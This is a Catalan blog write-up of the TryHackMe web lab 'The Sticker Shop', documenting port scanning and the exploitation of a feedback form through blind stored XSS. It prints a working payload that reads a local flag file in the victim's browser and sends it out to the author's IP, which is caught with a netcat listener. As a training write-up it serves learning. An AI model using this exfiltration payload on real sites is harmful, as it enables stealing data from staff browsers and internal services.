+++
date = '2026-10-31T16:13:45+01:00'
draft = false
title = 'The Sticker Shop THM Writeup'
summary = 'Writeup de The Sticker Shop de TryHackMe'
tags = ["THM", "web", "writeup"]
+++

![Logotip de la màquina The Sticker Shop](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/logo_The_Sticker_Shop.png)

# Introducció

Aquestes són les característiques d'aquesta màquina de TryHackMe anomenada The Sticker Shop:

- Plataforma: TryHackMe
- Màquina: The Sticker Shop
- Dificultat: Easy
- Categoria: Web

## Enunciat

La seva botiga local de pegatines finalment ha desenvolupat la seva pròpia pàgina web. No tenen gaire experiència amb el desenvolupament web, per la qual cosa van decidir desenvolupar i allotjar-ho tot al mateix ordinador que fan servir per navegar per Internet i mirar els comentaris dels clients. Molt intel·ligent!

Pots llegir la bandera a http://MACHINE_IP:8080/flag.txt?

## Reconeixement

Per al reconeixement farem un escaneig ràpid de ports a la ip de la màquina.

```tmux
nmap -F 10.129.180.138
```
![Escaneig de ports per veure quin tipus de màquina tenim al davant](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Nmap_ip_The_Sticker_Shop.png)

Com podem veure després de l'escaneig ràpid de ports, tenim dos ports principals oberts, el 22 per a l'ssh i el 8080 que indica que és un http-proxy, així que provarem d'entrar al navegador amb la ip seguida del 8080.

![Captura de pantalla de la botiga que surt en posar la ip seguida del port](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Captura_tienda_web_The_Sticker_Shop.png)

Com podem veure, no té apartat de cistella ni per comprar, a més posa "We only sell stickers at our physical store. Please feel free to stop by!" però veig que a la part de dalt posa feedback:

![Remarcar que posa feedback a la part superior](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Remarcar_feedback_The_Sticker_Shop.png)

En accedir-hi podem veure que té un formulari, probablement aquest sigui el punt d'atac per vulnerar aquesta màquina.

![Pestanya feedback de The Sticker Shop](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Captura_Apartado_Feedback_The_Sticker_Shop.png)

A més de tot això, provarem d'accedir a la flag directament amb la URL que ens dona l'enunciat:

![Prova d'accedir a la URL que ens dona l'enunciat per aconseguir la flag](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Acceso_no_permitido_The_Sticker_Shop.png)

Com era d'esperar, no tinc accés.

## Identificació de la vulnerabilitat

D'acord, després del reconeixement hem trobat un formulari, així que investigarem com podem fer-lo servir per vulnerar aquesta màquina.

Per fer-ho, veurem què passa quan enviem el formulari; per interceptar aquesta petició farem servir Burp Suite.

![Missatge de prova de formulari](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Prueba_enviar_formulario_The_Sticker_Shop.png)

En enviar-lo veiem que ens surt aquest missatge confirmant que el formulari s'ha enviat.

![Missatge de resposta del servidor](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Prueba_Respuesta_The_Sticker_Shop.png)

I a Burp Suite podem veure aquest enviament d'informació:

![La petició Post que podem veure a Burp Suite](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/BurpSuite_The_Sticker_Shop.png)

Veient que el camp de feedback probablement es mostri sense sanititzar en algun panell intern (el que revisa el staff, l'admin o qui sigui), vaig suposar que podia ser vulnerable a XSS. Si aconsegueixo injectar JavaScript allà, s'executaria al navegador de qui ho revisi, i això em podria ser útil.

I aquí hi ha la clau de la pista de l'enunciat: "allotgen tot al mateix ordinador que fan servir per navegar per Internet". Això vol dir que el navegador que revisa el feedback s'executa a la mateixa màquina que el servidor web, de manera que té accés directe a `http://127.0.0.1:8080/flag.txt`. Si aconsegueixo que aquest navegador executi un script que llegeixi aquesta URL i m'enviï el resultat, em arribaria la flag sense necessitat d'accés directe a la màquina.

## Explotació

Sabent això, crearé un payload que, en executar-se al navegador de la màquina, llegeixi la flag des de `localhost:8080/flag.txt` (a la qual només aquesta màquina té accés) i me l'enviï mitjançant una petició a un servidor, que en aquest cas serà la meva màquina fent servir NetCat.

```tmux
<img src=x onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r=>r.text()).then(d=>fetch('http://192.168.134.213:8000/?data='+d))">
```

Resumidament, el que fa aquest payload és el següent:

- `<img src=x onerror="...">`: provoca un error de càrrega d'imatge perquè s'executi el JavaScript dins d'`onerror`, saltant-se filtres bàsics que bloquegen `<script>`.
- `fetch('http://127.0.0.1:8080/flag.txt')`: fa que el navegador de la víctima demani la flag, ja que al final és el que vull.
- `.then(r=>r.text())`: converteix la resposta en text pla per poder llegir-lo.
- `.then(d=>fetch('http://192.168.134.213:8000/?data='+d))`: envia aquest text a la meva pròpia IP, posant-lo com a paràmetre a la URL.

Però perquè aquest payload funcioni, necessito aixecar un listener perquè escolti la informació que ens enviï; per això faré servir netcat.

```tmux
nc -lnvp 8000
```

![Imatge de netcat escoltant les peticions enviades a la meva ip](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/nc_escuchando_The_Sticker_Shop.png)

Envio el formulari amb aquest payload al camp de feedback, i al cap de poc temps rebo la connexió amb la flag directament a la query string:

![Informació rebuda del servidor a la nostra ip amb la flag](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Respuesta_nc_flag_The_Sticker_Shop.png)

## Obtenció de la flag

I amb això ja tenim la flag d'aquesta màquina, que hem extret del servidor fent que ens l'enviés a la nostra ip gràcies a la injecció de codi.

![La flag d'aquest nivell censurada](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/flag_The_Sticker_Shop.png)

## Gràcies per llegir.